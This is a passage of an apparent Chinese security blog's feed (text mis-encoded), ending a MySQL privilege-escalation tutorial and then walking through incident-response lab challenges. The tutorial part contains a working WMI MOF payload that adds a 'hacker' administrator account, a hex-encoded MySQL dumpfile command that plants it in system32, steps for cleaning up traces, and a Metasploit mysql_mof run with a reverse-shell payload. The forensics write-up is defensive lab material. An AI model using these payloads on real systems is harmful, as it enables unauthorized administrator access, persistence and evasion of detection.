æœ‰æƒé™æ“ä½œ mof ç›®å½•çš„è¯ï¼Œå°±å¯ä»¥æ¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ã€‚</p><p><strong>mofè„šæœ¬çš„å†…å®¹</strong></p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">#pragma name<span class="hljs-built_in">space</span>(<span class="hljs-string">&quot;\\\\.\\root\\subscription&quot;</span>) <br><br>instance of __EventFilter as $EventFilter <br>&#123; <br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>; <br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>; <br>&#125;; <br><br>instance of ActiveScriptEventConsumer as $Consumer <br>&#123; <br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>; <br>    ScriptText = <br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker P@ssw0rd /add\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="hljs-string">&quot;)&quot;</span>; <br>&#125;; <br><br>instance of __FilterToConsumerBinding <br>&#123; <br>    Consumer   = $Consumer; <br>    Filter = $EventFilter; <br>&#125;;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒpayload</p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">var WSH = <span class="hljs-keyword">new</span> ActiveXObject(\<span class="hljs-string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)<br>#è¿™ä¸¤æ®µæŒ‡ä»¤åˆ†åˆ«æ˜¯ä½¿ç”¨net.exeå·¥å…·æ·»åŠ ä¸€ä¸ªåä¸º<span class="hljs-string">&quot;hacker&quot;</span>çš„æ–°ç”¨æˆ·ï¼Œå¯†ç è®¾ç½®ä¸º<span class="hljs-string">&quot;P@ssw0rd&quot;</span>ã€‚/addå‚æ•°è¡¨ç¤ºæ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·<br>#å°†ç”¨æˆ·<span class="hljs-string">&quot;hacker&quot;</span>æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆlocalgroup administratorsï¼‰ã€‚è¿™æ„å‘³ç€<span class="hljs-string">&quot;hacker&quot;</span>ç”¨æˆ·å°†æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ã€‚<br></code></pre></td></tr></table></figure><p>ä¾ç„¶å¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•æŠŠæ–‡ä»¶å˜æˆåå…­è¿›åˆ¶å†™å…¥</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="hljs-keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;<br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸçš„çš„æ—¶å€™ï¼Œtest.mof ä¼šå‡ºç°åœ¨ï¼šc:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;good&#x2F; ç›®å½•ä¸‹ å¦åˆ™å‡ºç°åœ¨ c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad ç›®å½•ä¸‹</p><p><strong>ç—•è¿¹æ¸…ç†</strong></p><p>å› ä¸ºæ¯éš”å‡ åˆ†é’Ÿæ—¶é—´åˆä¼šé‡æ–°æ‰§è¡Œæ·»åŠ ç”¨æˆ·çš„å‘½ä»¤ï¼Œæ‰€ä»¥æƒ³è¦æ¸…ç†ç—•è¿¹å¾—å…ˆæš‚æ—¶å…³é—­ winmgmt æœåŠ¡å†åˆ é™¤ç›¸å…³ mof æ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™å†åˆ é™¤ç”¨æˆ·æ‰ä¼šæœ‰æ•ˆæœ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åœæ­¢ winmgmt æœåŠ¡</span><br>net stop winmgmt<br><br><span class="hljs-comment"># åˆ é™¤ Repository æ–‡ä»¶å¤¹</span><br><span class="hljs-built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\<br><br><span class="hljs-comment"># æ‰‹åŠ¨åˆ é™¤ mof æ–‡ä»¶</span><br>del C:\Windows\system32\wbem\mof\good\test.mof /F /S<br><br><span class="hljs-comment"># åˆ é™¤åˆ›å»ºçš„ç”¨æˆ·</span><br>net user hacker /delete<br><br><span class="hljs-comment"># é‡æ–°å¯åŠ¨æœåŠ¡</span><br>net start winmgmt<br></code></pre></td></tr></table></figure><p><strong>msfææƒ</strong></p><p>msfé‡Œé¢å°±æœ‰mofææƒçš„æ¨¡å—ï¼Œè¿˜ä¼šè‡ªåŠ¨æ¸…ç†ç—•è¿¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/windows/mysql/mysql_mof<br><span class="hljs-comment"># è®¾ç½®å¥½è‡ªå·±çš„ payload</span><br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><br><span class="hljs-comment"># è®¾ç½®ç›®æ ‡ MySQL çš„åŸºç¡€ä¿¡æ¯</span><br>msf6 &gt; <span class="hljs-built_in">set</span> rhosts 10.211.55.21<br>msf6 &gt; <span class="hljs-built_in">set</span> username root<br>msf6 &gt; <span class="hljs-built_in">set</span> password root<br>msf6 &gt; run<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.sqlsec.com/2020/11/mysql.html&quot;&gt;https://www.sqlsec.com/2020/11/mysql.html&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;æƒé™è·å–&quot;&gt;&lt;a href=&quot;#æƒé™è·å–&quot; </summary>
      
    
    
    
    <category term="ææƒ" scheme="https://clowsman.github.io/categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="mysql" scheme="https://clowsman.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>ç„æœºåº”æ€¥å“åº”é¶åœº-ç¬¬äºŒç« </title>
    <link href="https://clowsman.github.io/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</id>
    <published>2024-07-10T06:31:01.000Z</published>
    <updated>2024-07-15T08:45:17.051Z</updated>
    
    <content type="html"><![CDATA[<h1 id="apacheæ—¥å¿—åˆ†æ"><a href="#Apacheæ—¥å¿—åˆ†æ" class="headerlink" title="Apacheæ—¥å¿—åˆ†æ"></a>Apacheæ—¥å¿—åˆ†æ</h1><p>é¶åœºç®€ä»‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è´¦å·å¯†ç  root apacherizhi<br>ssh root@IP<br>1ã€æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š<br>2ã€é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š<br>3ã€æŸ¥çœ‹index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š<br>4ã€æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼š<br>5ã€æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°:<br></code></pre></td></tr></table></figure><p>apacheçš„æ—¥å¿—æ”¾åœ¨&#x2F;var&#x2F;log&#x2F;apacheç›®å½•ä¸‹é¢</p><p><img src="http://cdn.clown2024.cn/202407151644888.png" alt="image-20240710153749475"></p><p>ç„¶åç”¨ä¸‹é¢æŒ‡ä»¤ç­›é€‰å‡ºè®¿é—®çš„ipæ¬¡æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -d- -f 1 access.log.1|<span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-built_in">head</span> -20 <br><span class="hljs-comment">#----------</span><br><span class="hljs-built_in">cut</span>å‘½ä»¤ç”¨äºå‰ªåˆ‡å¹¶åˆ†å‰²æ–‡ä»¶ä¸­çš„è¡Œã€‚<br>-d-æŒ‡å®šåˆ†éš”ç¬¦ä¸º<span class="hljs-string">&quot;-&quot;</span>ï¼Œå³ä»¥è¿å­—ç¬¦ä½œä¸ºå­—æ®µçš„åˆ†éš”ç¬¦ã€‚<br>-f 1æŒ‡å®šåªæå–æ¯ä¸ªå­—æ®µçš„ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¡Œçš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚<br><br><span class="hljs-built_in">sort</span>å‘½ä»¤ç”¨äºå¯¹æ–‡æœ¬è¡Œè¿›è¡Œæ’åºã€‚<br>-ré€‰é¡¹è¡¨ç¤ºä»¥é€†åºï¼ˆä»å¤§åˆ°å°ï¼‰æ’åºã€‚<br>-né€‰é¡¹è¡¨ç¤ºæŒ‰ç…§æ•°å€¼å¤§å°è¿›è¡Œæ’åºã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644889.png" alt="image-20240710155027635"></p><p>flag{192.168.200.2}</p><p>æµè§ˆå™¨æŒ‡çº¹å°±è¿‡æ»¤ä¸€ä¸‹çœ‹çœ‹å…·ä½“çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep 192.168.200.2<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644890.png" alt="image-20240710155145579"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//æµè§ˆå™¨æŒ‡çº¹<br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<br><br>flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;<br></code></pre></td></tr></table></figure><p> æ‰¾index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;/index.php&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment"># wc -lå‘½ä»¤ç”¨äºè®¡ç®—åŒ¹é…åˆ°çš„è¡Œæ•°ï¼Œflag&#123;27&#125;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644891.png" alt="image-20240711125509920"></p><p>æŸ¥æ‰¾é»‘å®¢ipè®¿é—®çš„æ¬¡æ•°ï¼Œæˆ‘ä»¬åªè¦æŠŠå»æ‰é‡å¤è¡Œæ”¹æˆè®¡ç®—åŒ¹é…è¡Œæ•°å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;192.168.200.2 - -&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment">#flag&#123;6555&#125;</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼ŒæŠŠç¬¬ä¸€ä¸ªæŸ¥çœ‹è®¿é—®ipæ”¹æˆæ—¶é—´å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;03/Aug/2023:08:&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -nr| <span class="hljs-built_in">uniq</span> -c<br><span class="hljs-comment"># æˆ‘ä»¬è¦ç”¨ipæ¥åŒ¹é…æ‰èƒ½æ­£ç¡®å»æ‰é‡å¤è¡Œï¼Œæ‰€ä»¥è¦å…ˆawkæ‰“å°ç¬¬ä¸€ä¸ªå­—æ®µä¹Ÿå°±æ˜¯ip</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644892.png" alt="image-20240711130832864"></p><p>flag{5}</p><h1 id="mysqlåº”æ€¥å“åº”"><a href="#mysqlåº”æ€¥å“åº”" class="headerlink" title="mysqlåº”æ€¥å“åº”"></a>mysqlåº”æ€¥å“åº”</h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mysqlåº”æ€¥å“åº” sshè´¦å· root  å¯†ç  xjmysql<br>ssh env.xj.edisec.net  -p xxxxx<br>1.é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell flag&#123;å…³é”®å­—ç¬¦ä¸²&#125; <br>2.é»‘å®¢åå¼¹shellçš„ip flag&#123;ip&#125;<br>3.é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ md5 flag&#123;md5&#125; æ³¨ /xxx/xxx/xxx/xxx/xxx.xx<br>4.é»‘å®¢è·å–çš„æƒé™ flag&#123;whoamiåçš„å€¼&#125;<br></code></pre></td></tr></table></figure><p>å…ˆå»çœ‹ä¸€ä¸‹mysqlçš„æ—¥å¿—ï¼Œåœ¨&#x2F;var&#x2F;log&#x2F;mysqlä¸‹é¢</p><p><img src="http://cdn.clown2024.cn/202407151644893.png" alt="image-20240711182807349"></p><p><img src="http://cdn.clown2024.cn/202407151644894.png" alt="image-20240711182925627"></p><p>çœ‹çœ‹webç›®å½•ä¸‹æœ‰æ²¡æœ‰è¢«å†™shellï¼Œæ¯•ç«Ÿä¸€èˆ¬éƒ½æ˜¯ä»ç½‘ç«™å¼€å§‹æ¸—é€çš„</p><p><img src="http://cdn.clown2024.cn/202407151644895.png" alt="image-20240711183039409"></p><p>æœç„¶æœ‰ï¼Œflag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}</p><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æ²³é©¬æŸ¥æ€ï¼Œåˆšå­¦åˆ°çš„ï¼Œä¸‹è½½ä¹Ÿå¾ˆå¿«ï¼Œè¿™æ˜¯å®˜ç½‘ï¼š<a href="https://www.shellpub.com/doc/hm_linux_usage.html">https://www.shellpub.com/doc/hm_linux_usage.html</a></p><p>ç”¨æ³•ä¹Ÿå¾ˆç®€å•</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä¸‹è½½è§£å‹ç¼©</span><br>wget -O /opt/hm-linux.tgz http://dl.shellpub.com/hm/latest/hm-linux-amd64.tgz?version=1.7.0<br><span class="hljs-built_in">cd</span> /opt<br>tar xvf hm-linux.tgz<br><span class="hljs-comment"># ä½¿ç”¨</span><br>./hm deepscan &lt;è¦æ‰«æçš„ç›®å½•&gt; <span class="hljs-comment"># æ·±åº¦æ‰«æï¼Œæ‰«æå®Œæˆä¹‹åç»“æœä¼šä¿å­˜ä¸ºresult.csvæ–‡ä»¶</span><br>./hm scan &lt;è¦æ‰«æçš„ç›®å½•&gt; <span class="hljs-comment">#æ‰«æå®Œæˆä¹‹åç»“æœä¼šä¿å­˜ä¸ºresult.csvæ–‡ä»¶ï¼Œä½¿ç”¨è®°äº‹æœ¬æˆ–è€…excelæ‰“å¼€æŸ¥çœ‹</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644896.png" alt="image-20240711183620135"></p><p>æŸ¥æ‰¾åå¼¹shellçš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹error.logæœ‰æ²¡æœ‰ä»€ä¹ˆå¼‚å¸¸çš„åœ°æ–¹</p><p><img src="http://cdn.clown2024.cn/202407151644897.png" alt="image-20240711183935052"></p><p>æ„Ÿè§‰&#x2F;tmp&#x2F;1.shæœ‰ç‚¹å¥‡æ€ªï¼Œå»çœ‹ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151644898.png" alt="image-20240711184013639"></p><p>å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªbashçš„åå¼¹shellæŒ‡ä»¤ï¼Œæ‰¾åˆ°åå¼¹çš„åœ°å€ï¼Œflag{192.168.100.13}</p><p>è¿™ä¸ªæ–‡ä»¶åœ¨&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;ä¸‹ä¹Ÿæœ‰</p><p><img src="http://cdn.clown2024.cn/202407151644899.png" alt="image-20240712001549368"></p><p>å¯»æ‰¾é»‘å®¢ææƒçš„å®Œæ•´è·¯å¾„ï¼Œè¿™é‡Œèƒ½å¤Ÿææƒåº”è¯¥æ³„éœ²äº†ä¸€äº›ç”¨æˆ·ä¿¡æ¯ï¼Œæˆ‘ä»¬å‘ç°åœ¨webç›®å½•ä¸‹çš„common.phpé‡Œé¢æœ‰rootç”¨æˆ·çš„ä¿¡æ¯</p><p><img src="http://cdn.clown2024.cn/202407151644900.png" alt="image-20240712002457267"></p><p>mysqlå¸¸è§„çš„ææƒå¥—è·¯å°±æ˜¯udfææƒï¼Œå¦‚æœæ˜¯çš„è¯é‚£ä¹ˆåº”è¯¥å°±ä¼šåœ¨ &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;ç•™ä¸‹æ–‡ä»¶ç—•è¿¹ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151644901.png" alt="image-20240711184502176"></p><p>é‚£ææƒè·¯å¾„å°±æ˜¯&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.soï¼Œflag{b1818bde4e310f3d23f1005185b973e7}</p><p>æŸ¥çœ‹ææƒåçš„æƒé™ï¼Œçœ‹ä¸€ä¸‹è¿›ç¨‹è¯¦ç»†ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps -aux<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644902.png" alt="image-20240711184705362"></p><p>å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯é‚£ä¸ªmysqlçš„ç”¨æˆ·ï¼Œé‚£ä¹ˆæƒé™å°±æ˜¯flag{mysql}</p><p>æˆ–è€…è¿›å…¥åˆ°mysqlé‡Œé¢ç”¨**select sys_eval(â€œwhoamiâ€);**æŸ¥çœ‹å½“å‰ç”¨æˆ·</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/JACKBREAK/article/details/139037618">https://blog.csdn.net/JACKBREAK/article/details/139037618</a></p><h1 id="redisåº”æ€¥å“åº”"><a href="#redisåº”æ€¥å“åº”" class="headerlink" title="redisåº”æ€¥å“åº”"></a>redisåº”æ€¥å“åº”</h1><p>é¶æœºä»‹ç»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æœåŠ¡å™¨åœºæ™¯æ“ä½œç³»ç»Ÿ Linux<br>æœåŠ¡å™¨è´¦å·å¯†ç  root xjredis<br><br>ä»»åŠ¡ç¯å¢ƒè¯´æ˜<br>    æ³¨ï¼šæ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼æ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼æ ·æœ¬è¯·å‹¿åœ¨æœ¬åœ°è¿è¡Œï¼ï¼ï¼<br>    åº”æ€¥å“åº”å·¥ç¨‹å¸ˆå°ç‹æŸäººæ”¶åˆ°å®‰å…¨è®¾å¤‡å‘Šè­¦æœåŠ¡å™¨è¢«æ¤å…¥æ¶æ„æ–‡ä»¶ï¼Œè¯·ä¸Šæœºæ’æŸ¥<br></code></pre></td></tr></table></figure><p>æ­¥éª¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„ IP ä¸ºå¤šå°‘,å°†é»‘å®¢ IP ä½œä¸º FLAG æäº¤;<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶,å°†é»‘å®¢ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶é‡Œé¢çš„ FLAG æäº¤;<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢åå¼¹ shell çš„IP ä¸ºå¤šå°‘,å°†åå¼¹ shell çš„IP ä½œä¸º FLAG æäº¤;<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”æº¯æºåˆ†æé»‘å®¢çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æ‰¾åˆ°é»‘å®¢ä½¿ç”¨çš„å·¥å…·é‡Œçš„å…³é”®å­—ç¬¦ä¸²(flag&#123;é»‘å®¢çš„ç”¨æˆ·-å…³é”®å­—ç¬¦ä¸²&#125; æ³¨å…³é”®å­—ç¬¦ä¸² xxx-xxx-xxx)ã€‚å°†ç”¨æˆ·åå’Œå…³é”®å­—ç¬¦ä¸²ä½œä¸º FLAGæäº¤<br>é€šè¿‡æœ¬åœ° PC SSHåˆ°æœåŠ¡å™¨å¹¶ä¸”åˆ†æé»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤,å°†é»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤é‡Œé¢çš„å…³é”®å­—ç¬¦ä¸²ä½œä¸º FLAG æäº¤;<br></code></pre></td></tr></table></figure><p>é‚£å°±å…ˆå»çœ‹ä¸€ä¸‹redisçš„æ—¥å¿—åœ¨&#x2F;var&#x2F;logä¸‹é¢</p><p><img src="http://cdn.clown2024.cn/202407151644903.png" alt="image-20240712004115278"></p><p>è¿™é‡Œæ‰¾åˆ°ä¸€å¼ ä¸»ä»å¤åˆ¶æ—¶çš„é€šä¿¡è¿‡ç¨‹å›¾ï¼Œæ‰€ä»¥æœ‰<strong>Master replied to PING</strong>çš„å­—æ®µå³ä¸ºè¿æ¥æˆåŠŸ</p><p><img src="http://cdn.clown2024.cn/202407151644904.png" alt="image-20240712011533382"></p><p><img src="http://cdn.clown2024.cn/202407151644905.png" alt="image-20240712004200679"></p><p>è¿™é‡Œå¾ˆæ˜æ˜¾åº”è¯¥æ˜¯ä¸€ä¸ªredisçš„ä¸»ä»å¤åˆ¶ï¼Œä½†æ˜¯éƒ½æ˜¯å¤±è´¥è¿æ¥ï¼Œå†å¾€ä¸‹è¿˜æœ‰å°è¯•å…¶ä»–ipçš„è¿æ¥ï¼Œæœ€åæˆåŠŸçš„æ˜¯20çš„ip</p><p><img src="http://cdn.clown2024.cn/202407151644906.png" alt="image-20240712004754137"></p><p>flag{192.168.100.20}</p><p>æ—¢ç„¶æ˜¯ä¸»ä»å¤åˆ¶é‚£ä¸€èˆ¬å°±ä¼šä¸Šä¼ æœ‰soæ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨å‘½ä»¤æŸ¥çœ‹soæ–‡ä»¶åœ¨å“ªé‡Œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;exp.so&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644907.png" alt="image-20240712005221837"></p><p>å¯ä»¥çœ‹åˆ°åœ¨æ ¹ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬æŸ¥çœ‹å†…å®¹é‡Œé¢æœ‰flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xxd /exp.so<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644908.png" alt="image-20240712005512837"></p><p>flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</p><p>çœ‹ä¸€ä¸‹å®šæ—¶ä»»åŠ¡æ‰¾åå¼¹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">corntab -l<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644909.png" alt="image-20240712005613810"></p><p>flag{192.168.10.13}</p><p>æº¯æºå¯ä»¥å»çœ‹ä¸€ä¸‹.sshä¸‹çš„authorized_keys</p><p><img src="http://cdn.clown2024.cn/202407151644910.png" alt="image-20240712005919183"></p><p>æ‰¾åˆ°äº†ä»–çš„ç”¨æˆ·å</p><p>xj-test-userï¼Œç„¶åå»githubä¸Šçœ‹ä¸€ä¸‹è¯¥ç”¨æˆ·ï¼Œå¯ä»¥æ‰¾åˆ°ä»–ä½¿ç”¨çš„å·¥å…·</p><p><img src="http://cdn.clown2024.cn/202407151644911.png" alt="image-20240712010113376"></p><p>å†å»æ‰¾ä»–çš„å†å²commit</p><p><img src="http://cdn.clown2024.cn/202407151644912.png" alt="image-20240712010420376"></p><p>åœ¨first commité‡Œé¢</p><p><img src="http://cdn.clown2024.cn/202407151644913.png" alt="image-20240712010539821"></p><p>flag{xj-test-user-wow-you-find-flag}</p><p>æœ€åæŸ¥æ‰¾ç¯¡æ”¹çš„å‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥å»&#x2F;usr&#x2F;binç›®å½•ä¸‹æŸ¥çœ‹ï¼Œè¿™é‡Œæ”¹çš„æ˜¯pså‘½ä»¤ï¼Œæˆ‘å°±è¯´ä¸€å¼€å§‹ç”¨pså‘½ä»¤ä¸ºä»€ä¹ˆæ€ªæ€ªçš„</p><p><img src="http://cdn.clown2024.cn/202407151644914.png" alt="image-20240712011217461"></p><p>flag{c195i2923381905517d818e313792d196}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;apacheæ—¥å¿—åˆ†æ&quot;&gt;&lt;a href=&quot;#Apacheæ—¥å¿—åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;Apacheæ—¥å¿—åˆ†æ&quot;&gt;&lt;/a&gt;Apacheæ—¥å¿—åˆ†æ&lt;/h1&gt;&lt;p&gt;é¶åœºç®€ä»‹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight pla</summary>
      
    
    
    
    <category term="åº”æ€¥å“åº”" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="åº”æ€¥å“åº”" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>ç„æœºåº”æ€¥å“åº”é¶åœº-ç¬¬ä¸€ç« </title>
